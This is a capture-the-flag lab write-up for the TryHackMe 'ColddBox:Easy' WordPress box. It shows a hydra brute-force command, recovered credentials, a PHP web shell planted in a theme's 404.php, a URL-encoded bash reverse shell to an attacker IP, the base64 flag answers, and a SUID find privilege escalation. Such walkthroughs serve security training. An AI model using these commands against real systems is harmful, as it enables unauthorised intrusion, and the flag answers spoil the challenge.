TryHackMe.com

Box = ColddBox:Easy

export IP=10.10.162.148

# NMAP SCANS

```
# Nmap 7.60 scan initiated Sun Jan 10 10:20:53 2021 as: nmap -A -T4 -oN colddbox/nmap/NmapScan 10.10.162.148
Nmap scan report for ip-10-10-162-148.eu-west-1.compute.internal (10.10.162.148)
Host is up (0.00086s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
MAC Address: 02:BE:D2:93:56:BF (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.86 ms ip-10-10-162-148.eu-west-1.compute.internal (10.10.162.148)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 10 10:21:06 2021 -- 1 IP address (1 host up) scanned in 13.24 seconds

```

# INTERESTING FINDS

```
- Nmap shows wordpress version 4.1.31.
- gobuster reveals /wp-login.php which is a login page.
- /wp-admin redirects us to login page.
- /wp-trackback.php shows a message:I really need an ID for this to work
- /hidden page has message: (
U-R-G-E-N-T
C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
)
- /wp-includes page shows different files and directory
- gobuster also shows /xmlrpc.php which is vulnerable to bruteforcing.
- using hydra we can login to the webserver
(command used: hydra -L [path_to_file_usernames] -P [Path_to_passwords] [IP_address] http-form-post '/wp-login.php:log^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location')
- Credentials found: (c0ldd:9876543210)
- editing 404.php file in theme resulted in RCE(system ($_REQUEST['cmd']);)
- payload bash script to get reverse shell needs to be urlencoded(cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftwetcp%2F10.10.88.184%2F9000%200%3E%261%27)(in /wp-content/themes/twentyfifteen/404.php?)
```
# TASK 1: user.txt? (Note: needs to be encoded)

- mVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==

# TASK 2: root.txt? (Note: needs to be encoded)

-wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=


# How to find the flags?

- Look for files or binaries with weird SUID permissions either manual or automated.

Solution i found:

- command: find / -perm -4000 2>/dev/null
- this shows that find command has also SUID bit permission set so we can escalate from here.

# TO ESCALATE PRIVILEGES:

- go to gtfobins and look for find (https://gtfobins.github.io/gtfobins/find/)
- command: ./find . -exec /bin/sh -p \; -quit (note: run it in its directory)
